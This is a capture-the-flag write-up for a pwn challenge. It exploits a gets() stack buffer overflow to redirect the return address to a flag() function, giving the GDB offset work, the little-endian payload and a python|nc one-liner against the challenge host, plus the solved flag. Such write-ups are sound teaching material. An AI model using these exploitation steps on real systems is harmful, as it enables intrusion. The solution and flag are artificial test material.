# Overflowo
* **Category:** Pwn
* **Points:** 300
## Problem

i made an owoifier!

`nc challenges.ctfd.io 30061`

## Solution
In this challenge, we'll be using a buffer overflow. With this strategy, we can overflow the space allocated on the stack for variables, and overwrite other pieces of memory.

If we examine the source code, we can see that there's a `flag()` function that will read a `flag.txt` file and print it out. However, this function is never called anywhere in the rest of the code.
Another function of interest is `vuln()`: 

```c
void vuln() {
	char owo[32];
	puts("Welcome to the owoifier!");
	printf("Please input a string to be owoified: ");
	gets(owo);
	printf("jk this owoifier sucks but here's what you input: %s\ni tried umu\n", owo);
}
```
In the code above, the buffer variable was initialized using `char owo[32];`. This creates an array of 32 characters, which can be used to store 32 characters of user input.
If we input more than 32 characters, the buffer variable would overflow, and we could start overwriting other bits of memory.
This is because the gets() function is not secure; it does not check if the user input overflows the buffer variable.

Our goal in this challenge is to overflow the buffer variable, which will let us overwrite the return address on the stack and set it to the `flag()` function. The return address is stored somewhere below the buffer variable on the stack, so we need figure out how many bytes we have to input before we reach the return address.
To do this, we can use GDB. To open the binary in GDB, we can use `gdb vuln`.
Next, we can run it:
```
(gdb) run
```
At this point, we can use a pattern generator tool to find the number of bytes we need. We can use [this website](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to generate a pattern and calculate the offset.
```
Welcome to the owoifier!
Please input a string to be owoified: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
jk this owoifier sucks but here's what you input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
i tried umu

Program received signal SIGSEGV, Segmentation fault.
0x35624134 in ?? ()
```
Plugging `0x35624134` back into the website, we get `44` as the offset. This means we need 44 bytes of junk to overflow the variable and overwrite random things on the stack until we get to the return address.

Thus, the first part of our payload shall be `'A'*44`.

Next, we need to find the address of `flag()` so that we can use it to replace the return address on the stack. We can use GDB for this as well:
```
(gdb) info func
All defined functions:

Non-debugging symbols:
0x080483e8  _init
0x08048420  setbuf@plt
...
0x080485cb  flag
0x0804862f  vuln
...
```
This tells us the address of the `flag()` function is `0x080485cb`. Now all we need to do is add it to the payload.

When we add the address, we need to make sure to format it in little endian, in which the bytes are backwards. So, instead of `\x08\x04\x85\xcb` we will have `\xcb\x85\x04\x08`.

Our final payload will be:
```sh
'A'*44 + '\xcb\x85\x04\x08'
```
We can use Python to pipe our payload:
```sh
python -c "print('A'*44 + '\xcb\x85\x04\x08')" | nc challenges.ctfd.io 30061
```
This will output:
```
Welcome to the owoifier!
Please input a string to be owoified: jk this owoifier sucks but here's what you input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅
i tried umu
cctf{uwu_my_owo_buff3r}
Segmentation fault      (core dumped) ./vuln
```

Flag: `cctf{uwu_my_owo_buff3r}`
